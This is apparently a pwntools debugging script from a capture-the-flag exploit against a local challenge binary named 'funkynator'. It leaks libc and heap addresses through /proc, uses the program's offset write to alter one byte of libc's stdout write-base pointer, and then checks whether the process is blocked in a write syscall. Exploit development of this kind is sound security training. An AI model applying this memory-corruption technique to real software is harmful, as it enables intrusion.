#!/usr/bin/env python3
"""Check if process is blocked in write syscall."""
from pwn import *
import struct, time, os as pyos
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))
r.recvuntil(b'name?')
r.sendline(b'TEST')
r.recvuntil(b'> ')

for _ in range(2):
    r.sendline(b'2')
    r.recvuntil(b'length')
    r.recvline()
    r.sendline(b'5')
    r.recvuntil(b'message:')
    r.sendline(b'A' * 5)
    r.recvuntil(b'?')
    r.sendline(b'n')
    r.recvuntil(b'?')
    r.sendline(b'y')
    r.recvuntil(b'location')
    r.recvline()
    r.recvuntil(b'> ')

pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
binary_base = libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if len(p) < 5: continue
    if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        binary_base = int(p[0].split('-')[0], 16)
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary_base + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0; WB_OFF = 0x20
with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc_base + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
off = ((libc_base + STDOUT + WB_OFF + 1) - msg2) & 0xFFFFFFFFFFFFFFFF

log.info(f"libc={libc_base:#x} msg2={msg2:#x}")
log.info(f"byte1: {orig_byte1:#04x}->{new_byte1:#04x}")

r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'offset')
r.recvline()
r.sendline(str(off).encode())
r.recvuntil(b'with what')
r.recvline()
r.send(bytes([new_byte1]) + b'\n')

time.sleep(1)

# Check process state
try:
    with open(f'/proc/{pid}/status') as f:
        for line in f:
            if 'State' in line or 'SigCgt' in line:
                log.info(f"Proc status: {line.strip()}")
    
    # Check blocked syscall
    with open(f'/proc/{pid}/syscall') as f:
        syscall_info = f.read().strip()
        log.info(f"Blocked syscall: {syscall_info}")
except:
    log.info("Process already dead")

# Wait a bit more and check
time.sleep(2)
try:
    with open(f'/proc/{pid}/syscall') as f:
        syscall_info = f.read().strip()
        log.info(f"Blocked syscall (later): {syscall_info}")
except:
    log.info("Process dead")

# Now try to actually read from the pipe (non-blocking)
import fcntl
fd = r.proc.stdout.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | pyos.O_NONBLOCK)
time.sleep(0.5)
try:
    data = pyos.read(fd, 65536)
    log.info(f"Read {len(data)} bytes from pipe fd {fd}")
    if data:
        log.info(f"First bytes: {data[:100].hex()}")
except BlockingIOError:
    log.info("No data available (pipe empty, process not writing)")
except Exception as e:
    log.info(f"Pipe error: {e}")
fcntl.fcntl(fd, fcntl.F_SETFL, fl)

r.close()
